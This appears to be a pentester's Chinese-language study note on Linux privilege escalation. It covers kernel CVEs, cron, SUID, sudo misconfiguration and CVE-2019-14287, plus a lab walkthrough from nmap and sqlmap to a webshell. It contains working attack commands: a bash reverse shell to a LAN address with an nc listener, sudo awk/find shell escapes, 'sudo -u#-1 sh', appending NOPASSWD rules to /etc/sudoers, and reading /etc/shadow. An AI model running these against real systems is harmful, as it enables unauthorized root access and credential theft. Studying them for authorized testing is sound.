@@ -1,0 +1,178 @@
+inux提权：
+步骤：
+一：信息收集：
+1.系统信息：
+内核信息、主机名、系统架构、发行版信息、环境变量、cpu信息(是否虚拟机等)。
+2.环境信息：python等。
+3.进程信息：高权限进程等。
+4.软件信息。
+5.服务信息。
+6.用户和组信息。
+7.计划任务。
+8.可写目录。
+二：确定提权方法：
+1.凭证(密码)提权。
+2.内核漏洞提权：
+cve-2016-5195(脏牛；linux kernel>=2.6.22);
+cve-2019-13272(桌面版服务器带有pkexex、且需要当前用户有家目录；linux kernel<5.1.17)
+3.Crontab定时任务提权：如：高权限用户在/etc/crontab创建了定时任务，且我们对相应的文件具有读写权限，则重写对应的文件就很可能获得权限提升。
+4.suid提权。
+5. sudo配置错误提权。
+6. /etc/passwd配置错误提权。
+7.低版本sudo提权(CVE-2019-14287)
+三：辅助内容：
+1.提权命令辅助网站。
+https://lolbas-project.github.io/
+https://gtfobins.github.io/
+2.收集exp.
+如：
+https://securiteam.com
+https://www.securityfocus.com
+https://www.exploit-db.com
+https://www.rapid7.com/db
+https://www.exploitalert.com/search-results.html?search=
+https://github.com/lucyoa/kernel-exploits
+
+
+eg1:
+root的UID和GID都为0   uid=0
+普通用户id(uid属于1-499；新版本为>1000)
+
+
+cat /etc/crontab	//查看定时任务
+
+/tmp、/var/tmp目录一般任意用户都具有读写权限。
+
+
+凭证(密码)提权：
+
+LaZagne提取用户凭证：包括各个浏览器的等。
+https://github.com/AlessandroZ/LaZagne
+
+通过辅助脚本确定可利用内核漏洞提权EXP等信息：
+https://github.com/mzet-/linux-exploit-suggester
+使用命令：./linux-exploit-suggester.sh	//搜索当前系统暴露的漏洞
+
+
+searchsploit -u 		//更新searchsploit
+searchsploit 关键词 		//离线搜索EXP
+如：searchsploit "ubuntu"
+
+
+
+
+定时任务提权：
+虚拟机：桥接。
+
+
+
+渗透测试案例1：
+同网段主机->nmap 扫描(nmap -sS -T4 --open -sV  192.168.43.1/24)-->
+访问http端口-->看源码、注释-->使用kali自带工具(默认字典)扫描网站目录：
+dirb http://192.168.43.208:80/  -->发现登录链接： 弱口令-->burp抓包到sqlmap跑注入-->
+sqlmap -r w.txt --risk 3 --level 3  -->通过.git源码泄露，发现密码，登录-->登录成功-->
+上传一句话木马，antsword连接成功。获得www-data的shell。-->提权：
+浏览桌面等，发现权限777的文件。 backup.sh，猜测可能是定时任务。
+
+crontab -l		//仅能列出当前用户的定时任务。
+cat /etc/crontab	//仅列出所有的系统的定时任务。其他用户的一般不在里面。
+
+查看各种shell命令：或使用hacktools更方便。
+https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/#Bash
+
+-->nc -lvp 666    //使用nc监听，获取高权限反弹的shell。
+如： bash -c 'exec bash -i &>/dev/tcp/192.168.43.254/666 <&1'
+
+第二条路：内核提权。
+uname -a		//查看内核版本；发现为4.15.0
+上传查询本地exp漏洞脚本到有权限的目录(最好是777)。 chmod +x z.sh
+
+nc成功获取session，且为root用户。
+再次执行crontab -l	成功看到root用户执行的定时任务。
+
+要灵活，这条路不通，就走另一条。
+
+第三条路：SUID提权。
+SUID原理：即linux通过给予一个用户临时的高权限来运行某些程序或文件。该文件或程序在执行时，使得调用者暂时获得该文件拥有者(一般是给予的高权限)的权限。
+通过ls -l查看文件或目录。
+具有SUID的文件是在可执行权限(即x位置)上显示s.
+
+find / -perm -4000 2>/dev/null 	//查看拥有suid属性的二进制文件(root属主)
+发现有su、passwd等命令。
+到https://gtfobins.github.io/ 站点查看对应的提权使用命令。
+
+
+
+
+crontab定时任务提权：
+分钟、小时、日、月、周
+实例1：每1分钟执行一次myCommand
+* * * * * myCommand
+定时任务提权条件：
+1.计划任务以高权限运行；
+2.攻击者对相应的文件或脚本具有读写权限。
+
+
+SUID提权：
+SUID相当于赋予用户临时的(文件或程序)所有者权限。
+suid仅对二进制可执行文件有效。
+案例2：
+chmod +s /usr/bin/python	发现为：
+-rwsr-sr-x  1 root root      3602816 Jul 14 04:11 python2.7
+
+find / -perm -4000 2>/dev/null	//查看拥有suid属性的二进制文件(root属主)
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null 	
+//两种(sgid和suid)类型同时查看 (root属主)
+
+去https://gtfobins.github.io/站点搜索带有SUID标签的命令：
+搜索+suid即可。
+执行对应的命令，
+whoami为root则提权成功。
+测试命令：
+whoami
+cat /etc/shadow	能读取成功，则SUID提权成功。
+
+
+
+案例3：
+sudo配置错误提权：即能赋予当前用户root权限。
+流程：
+执行sudo命令-->linux查看/etc/sudoers文件，若用户有权限执行sudo命令，则输入密码，若正确，则成功。
+
+ALL=（ALL）：第一个ALL表示：所有的主机，第二个ALL所有的用户
+
+如：
+echo "ykj1 ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+则ykj1该用户名能在不需输入密码情况下切换到所有主机的所有用户，且执行所有命令。
+sudo -l	//查看当前用户的sudo命令的配置。
+去https://gtfobins.github.io/站点搜索带有SUDO标签的命令：
+搜索+suid即可。
+常用的有su命令：
+执行对应的sudo su提权成功。
+
+awk命令等。
+如sudo awk 'BEGIN {system("/bin/bash")}'
+
+eg4：指定特定命令可以以root权限运行
+echo "test ALL=(root) NOPASSWD:/usr/bin/find" >> /etc/sudoers
+允许test用户在不输入密码的情况下以root权限执行find命令
+sudo find . -exec /bin/bash \; -quit
+提权成功。
+
+eg5：/etc/passwd文件配置错误提权。如该文件普通用户也有写权限。
+该法需要看目标系统版本默认使用的密码加密算法，生成对应的hash，写入。
+或本地模拟生成。
+echo字符串最外面最好使用单引号。
+
+eg6：低版本SUDO提权(CVE-2019-14287)
+当/etc/sudoers 文件中存在 *=(ALL, *) 形式( 或test ALL=(ALL) ALL形式 )的配置时，本地攻击者可以通过指定用户ID为-1或者4294967295，从而以root权限在服务器上执行命令。
+影响版本 Sudo < 1.8.28
+
+sudo -V	//查看sudo版本
+
+利用：
+sudo –u#数字 系统命令
+注：(数字范围：-1~4294967295)
+如：
+sudo -u#-1 sh	
+
